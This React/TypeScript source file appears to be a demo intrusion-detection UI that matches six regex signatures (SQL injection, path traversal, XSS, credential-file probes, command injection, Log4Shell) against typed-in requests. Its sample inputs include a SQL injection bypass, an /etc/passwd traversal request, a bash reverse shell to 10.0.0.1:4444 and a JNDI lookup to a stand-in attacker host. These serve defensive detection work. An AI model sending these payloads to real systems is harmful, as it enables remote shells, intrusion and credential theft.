import React, { useState } from 'react';
import { ShieldAlert, AlertOctagon, CheckCircle, Play, Info, Sparkles } from 'lucide-react';
import { soundFx } from '../../utils/audio';

interface ThreatRule {
  id: string;
  name: string;
  regex: RegExp;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  description: string;
  cwe: string;
}

const THREAT_RULES: ThreatRule[] = [
  {
    id: 'SIG-SQLI-01',
    name: 'SQL Injection: Tautology & Union Exfil',
    regex: /(?:'|\%27)\s*(?:or|and)\s*(?:'|\%27)?\d+(?:'|\%27)?=\s*(?:'|\%27)?\d+|union\s+select\s+/i,
    severity: 'CRITICAL',
    description: 'Bypasses SQL authentication filters or unions sensitive database tables.',
    cwe: 'CWE-89',
  },
  {
    id: 'SIG-TRAV-02',
    name: 'Directory Path Traversal',
    regex: /(?:\.\.\/|\.\.\\|%2e%2e%2f|%2e%2e\/|\.\.%2f)/i,
    severity: 'HIGH',
    description: 'Attacker escapes application root to read sensitive system configuration files.',
    cwe: 'CWE-22',
  },
  {
    id: 'SIG-XSS-03',
    name: 'Stored / Reflected Cross-Site Scripting',
    regex: /<script[^>]*>|javascript:[^"'>]+|onerror\s*=\s*['"]?[^'">]+|onload\s*=/i,
    severity: 'MEDIUM',
    description: 'Injects client-side executable JavaScript payload to hijack session cookies.',
    cwe: 'CWE-79',
  },
  {
    id: 'SIG-SYS-04',
    name: 'Linux Credential File Exfiltration',
    regex: /(?:\/etc\/passwd|\/etc\/shadow|\/proc\/self\/environ|\/root\/\.ssh)/i,
    severity: 'CRITICAL',
    description: 'Direct probe targeting UNIX system credential stores or kernel environment.',
    cwe: 'CWE-200',
  },
  {
    id: 'SIG-RCE-05',
    name: 'OS Command Shell Injection & Pipe',
    regex: /(?:;|\||`|\$\()\s*(?:id|whoami|cat|bash|sh|nc|curl|wget)\s+/i,
    severity: 'CRITICAL',
    description: 'Attempts to execute shell binaries through unescaped command interpolations.',
    cwe: 'CWE-78',
  },
  {
    id: 'SIG-JNDI-06',
    name: 'Log4Shell / JNDI Remote Classloader',
    regex: /\$\{jndi:(?:ldap|rmi|dns|nis):\/\/[^}]+\}/i,
    severity: 'CRITICAL',
    description: 'Exploitation of Log4j JNDI lookup string to trigger remote class execution.',
    cwe: 'CWE-502',
  },
];

const SAMPLE_ATTACK_PAYLOADS = [
  { label: 'SQLi Bypass', text: "admin' OR 1=1 -- - UNION SELECT null, username, password FROM users" },
  { label: 'Path Traversal', text: 'GET /download?file=../../../../etc/passwd HTTP/1.1' },
  { label: 'RCE Reverse Shell', text: 'hostname=google.com; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' },
  { label: 'Log4Shell JNDI', text: 'User-Agent: ${jndi:ldap://evil-c2.attacker.net:1389/Exploit}' },
  { label: 'Benign Request', text: 'GET /api/v1/telemetry?node_id=GW-9982-ALPHA&status=nominal HTTP/1.1' },
];

export const IdsEvaluator: React.FC = () => {
  const [testPayload, setTestPayload] = useState(SAMPLE_ATTACK_PAYLOADS[0].text);
  const [matchedRules, setMatchedRules] = useState<ThreatRule[]>([]);
  const [hasEvaluated, setHasEvaluated] = useState(false);

  const evaluatePayload = (input: string = testPayload) => {
    soundFx.playExecute();
    const hits = THREAT_RULES.filter(rule => rule.regex.test(input));
    setMatchedRules(hits);
    setHasEvaluated(true);
    if (hits.length > 0) {
      soundFx.playAlert();
    }
  };

  return (
    <div className="flex flex-col gap-4">
      {/* Title */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3 border-b border-[#1e293b]">
        <div>
          <h2 className="text-sm font-bold tracking-widest text-[#f0f6fc] uppercase terminal-text flex items-center gap-2">
            <ShieldAlert className="w-4 h-4 text-sky-400" />
            Heuristic IDS Threat Evaluator
          </h2>
          <p className="text-xs text-slate-400 mt-0.5">
            Deterministic regex heuristics analyzer for detecting injection attacks, traversal, exfiltration, and RCE artifacts.
          </p>
        </div>
        <span className="text-[10px] px-2 py-0.5 rounded bg-sky-500/10 border border-sky-500/30 text-sky-400 terminal-text font-bold">
          6 ACTIVE HEURISTIC SIGNATURES
        </span>
      </div>

      {/* Attack Sample Presets */}
      <div className="flex items-center gap-2 overflow-x-auto pb-1">
        <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider terminal-text shrink-0">
          Inject Vector:
        </span>
        {SAMPLE_ATTACK_PAYLOADS.map((sample, idx) => (
          <button
            key={idx}
            onClick={() => {
              soundFx.playClick();
              setTestPayload(sample.text);
              evaluatePayload(sample.text);
            }}
            className="px-2.5 py-1 rounded text-xs bg-[#161b22] border border-[#30363d] text-slate-300 hover:text-sky-300 hover:border-sky-500/40 shrink-0 transition-colors"
          >
            {sample.label}
          </button>
        ))}
      </div>

      {/* Input Box */}
      <div className="flex flex-col gap-2">
        <label className="text-xs font-semibold text-slate-400">
          Target Request URI / Raw Network Payload:
        </label>
        <textarea
          value={testPayload}
          onChange={e => setTestPayload(e.target.value)}
          placeholder="Paste raw HTTP or socket request payload..."
          className="w-full h-24 bg-[#010409] border border-[#30363d] rounded-lg p-3 text-xs font-mono text-sky-300 focus:outline-none focus:border-sky-400 leading-relaxed resize-y"
        />
        <div className="flex items-center gap-2 mt-1">
          <button
            onClick={() => evaluatePayload()}
            className="px-4 py-2 rounded-lg bg-sky-500/20 border border-sky-500/50 text-sky-300 text-xs font-bold hover:bg-sky-500/30 transition-all flex items-center gap-2 shadow-[0_0_12px_rgba(56,189,248,0.15)]"
          >
            <Play className="w-3.5 h-3.5" />
            Evaluate Heuristic Rules
          </button>
        </div>
      </div>

      {/* Results Header */}
      {hasEvaluated && (
        <div className="flex flex-col gap-3 animate-in fade-in duration-200">
          <div className="p-3.5 rounded-lg border flex items-center justify-between"
            style={{
              backgroundColor: matchedRules.length > 0 ? 'rgba(244, 63, 94, 0.08)' : 'rgba(16, 185, 129, 0.08)',
              borderColor: matchedRules.length > 0 ? 'rgba(244, 63, 94, 0.4)' : 'rgba(16, 185, 129, 0.4)'
            }}
          >
            <div className="flex items-center gap-3">
              {matchedRules.length > 0 ? (
                <AlertOctagon className="w-5 h-5 text-rose-400 shrink-0 animate-pulse" />
              ) : (
                <CheckCircle className="w-5 h-5 text-emerald-400 shrink-0" />
              )}
              <div>
                <p className="text-xs font-bold terminal-text uppercase"
                  style={{ color: matchedRules.length > 0 ? '#f43f5e' : '#10b981' }}
                >
                  {matchedRules.length > 0
                    ? `[ALERT] ${matchedRules.length} THREAT SIGNATURE(S) TRIGGERED`
                    : 'CLEAN PAYLOAD // ZERO HEURISTIC MATCHES'}
                </p>
                <p className="text-[11px] text-slate-400 mt-0.5">
                  {matchedRules.length > 0
                    ? 'Payload contains patterns violating security boundary policies.'
                    : 'No known malicious injection or traversal tokens identified in this stream.'}
                </p>
              </div>
            </div>
            {matchedRules.length > 0 && (
              <span className="text-[10px] px-2.5 py-1 rounded bg-rose-950/60 border border-rose-800 text-rose-300 font-bold font-mono">
                CRITICAL THREAT
              </span>
            )}
          </div>

          {/* Triggered Rules List */}
          {matchedRules.length > 0 && (
            <div className="flex flex-col gap-2">
              <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider font-mono">
                Matched Rule Details:
              </span>
              {matchedRules.map(rule => (
                <div
                  key={rule.id}
                  className="p-3 rounded-lg bg-[#0f1117] border border-[#1e293b] flex flex-col gap-1.5 font-mono text-xs"
                >
                  <div className="flex items-center justify-between">
                    <span className="text-sky-300 font-bold">{rule.name}</span>
                    <div className="flex items-center gap-2">
                      <span className="text-[9px] px-1.5 py-0.5 rounded bg-slate-800 text-slate-400 border border-slate-700">
                        {rule.cwe}
                      </span>
                      <span className="text-[9px] px-1.5 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30 font-bold">
                        {rule.severity}
                      </span>
                    </div>
                  </div>
                  <p className="text-[11px] text-slate-400">{rule.description}</p>
                  <div className="text-[10px] text-slate-500 bg-[#07090e] p-1.5 rounded border border-slate-900 mt-1 truncate">
                    Pattern: {rule.regex.toString()}
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
};
